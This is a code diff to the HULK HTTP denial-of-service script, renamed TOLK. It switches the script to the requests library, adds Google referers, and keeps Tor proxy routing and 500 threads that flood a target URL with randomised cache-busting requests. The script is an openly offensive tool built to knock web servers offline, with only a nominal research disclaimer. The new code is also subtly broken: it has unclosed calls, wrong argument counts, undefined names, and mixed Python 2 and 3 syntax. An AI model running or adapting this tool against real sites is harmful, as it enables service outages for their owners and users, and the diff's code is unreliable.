@@ -1,20 +1,14 @@
 # ----------------------------------------------------------------------------------------------
-# HULK - HTTP Unbearable Load King
+# TOLK - HTTP Unbearable Load King
 #
 # this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
 # to their knees by exhausting the resource pool, its is meant for research purposes only
 # and any malicious usage of this tool is prohibited.
 #
-# author :  Barry Shteiman , version 1.0
+# author :  Barry Shteiman, MikeKamau, Maxim Muzafarov, Pr0xy671 , Version 2.1
 # ----------------------------------------------------------------------------------------------
-import urllib2
-import sys
-import threading
-import random
-import re
-import socks
-import socket
-
+import sys, requests, socks, socket; from threading import Thread; from requests.exceptions import HTTPError, ConnectionError
+from random import randint, choice; from re import search; from string import ascii_lowercase as alphabet
 
 #The following two lines connect to the local SOCKS5 proxy that's started on port 9050 when tor
 #starts up.
@@ -28,19 +22,17 @@ headers_useragents=[]
 headers_referers=[]
 request_counter=0
 flag=0
-safe=0
+safe=False
 
 def inc_counter():
 	global request_counter
 	request_counter+=1
-
 def set_flag(val):
 	global flag
 	flag=val
-
 def set_safe():
 	global safe
-	safe=1
+	safe=True
 	
 # generates a user agent array
 def useragent_list():
@@ -63,6 +55,8 @@ def useragent_list():
 def referer_list():
 	global headers_referers
 	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.google.co.uk/?q=')
+	headers_referers.append('http://www.google.ru/?q=')
 	headers_referers.append('http://www.usatoday.com/search/results?q=')
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 	headers_referers.append('http://' + host + '/')
@@ -78,10 +72,9 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
+	print 'USAGE: python tolk.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
-
 	
 #http request
 def httpcall(url):
@@ -101,21 +94,36 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+		requests.get(
+            		url,
+            		params={buildblock(): buildblock()},
+            		headers={
+                		'User-Agent': choice(useragents),
+                		'Cache-Control': 'no-cache',
+                		'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                		'Referer': choice(referers) + buildblock(),
+                		'Keep-Alive': randint(110, 120)}
+	except HTTPError as e:
 			#print e.code
 			set_flag(1)
 			print 'Response Code 500'
 			code=500
-	except urllib2.URLError, e:
+	except ConnectionError as e:
 			#print e.reason
 			sys.exit()
 	else:
-			inc_counter()
-			urllib2.urlopen(request)
+		inc_counter()
+		requests.get(
+            		url,
+        		params={buildblock(): buildblock()},
+            		headers={
+                		'User-Agent': choice(useragents),
+                		'Cache-Control': 'no-cache',
+                		'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                		'Referer': choice(referers) + buildblock(),
+                		'Keep-Alive': randint(110, 120)}
 	return(code)		
 
-	
 #http caller thread 
 class HTTPThread(threading.Thread):
 	def run(self):
@@ -145,7 +153,6 @@ if len(sys.argv) < 2:
 else:
 	if sys.argv[1]=="help":
 		usage()
-		sys.exit()
 	else:
 		print "-- HULK Attack Started --"
 		if len(sys.argv)== 3:
@@ -154,7 +161,7 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
+		m = search('http\://([^/]*)/?.*', url)
 		host = m.group(1)
 		for i in range(500):
 			t = HTTPThread()
